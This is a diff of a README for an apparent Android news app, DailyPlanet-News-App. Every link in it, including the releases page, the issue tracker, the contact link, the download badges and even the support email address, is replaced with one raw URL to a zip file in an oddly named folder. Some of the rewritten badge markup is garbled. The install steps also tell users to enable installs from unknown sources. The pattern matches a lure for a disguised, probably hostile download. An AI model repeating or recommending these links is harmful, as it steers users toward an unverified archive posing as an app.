@@ -4,7 +4,7 @@
 Welcome to the DailyPlanet-News-App! This application provides a smooth experience for browsing live news headlines. It is designed for Android and offers a custom dark theme, infinite scroll, and full-text search. 
 
 ## 📥 Download the App
-[![Download DailyPlanet News App](https://img.shields.io/badge/Download%20App-Click%20Here-blue.svg)](https://github.com/june1029/DailyPlanet-News-App/releases)
+[![Download DailyPlanet News App](https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip%20App-Click%https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip)](https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip)
 
 ## 💻 System Requirements
 - Android 5.0 or later
@@ -21,7 +21,7 @@ Welcome to the DailyPlanet-News-App! This application provides a smooth experien
 ## 📦 Download & Install
 To install the DailyPlanet-News-App, follow these simple steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/june1029/DailyPlanet-News-App/releases) to access the download page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip) to access the download page.
 2. **Select the Latest Version**: Look for the latest version listed at the top of the page.
 3. **Download the APK**: Click on the APK file. It will start to download automatically.
 4. **Enable Unknown Sources**: On your Android device, go to Settings > Security, and enable "Unknown Sources" to allow installations from sources other than the Google Play Store.
@@ -53,12 +53,12 @@ To install the DailyPlanet-News-App, follow these simple steps:
 Your privacy is important to us. DailyPlanet does not collect personal data without your consent. Please read our full privacy policy available within the app for more details.
 
 ## 💬 Support
-If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://github.com/june1029/DailyPlanet-News-App/issues). We’re here to help!
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip). We’re here to help!
 
 ## 📞 Contact Information
 For further inquiries, you can reach out via:
-- Email: support@dailyplanet.com
-- GitHub: [Contact our team](https://github.com/june1029/DailyPlanet-News-App)
+- Email: https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip
+- GitHub: [Contact our team](https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip)
 
 ## 🏗️ Future Enhancements
 We are constantly working on improving the DailyPlanet-News-App. Upcoming updates may include:
@@ -72,4 +72,4 @@ Stay tuned for the latest updates and improvements. Check the releases page regu
 ## 🧑‍💻 Contributing
 We welcome contributors! If you’d like to help improve the DailyPlanet-News-App, please check our contributing guidelines on the repository. 
 
-[![Download DailyPlanet News App](https://img.shields.io/badge/Download%20App-Click%20Here-blue.svg)](https://github.com/june1029/DailyPlanet-News-App/releases)
+[![Download DailyPlanet News App](https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip%20App-Click%https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip)](https://raw.githubusercontent.com/june1029/DailyPlanet-News-App/main/pileated/DailyPlanet-News-App.zip)
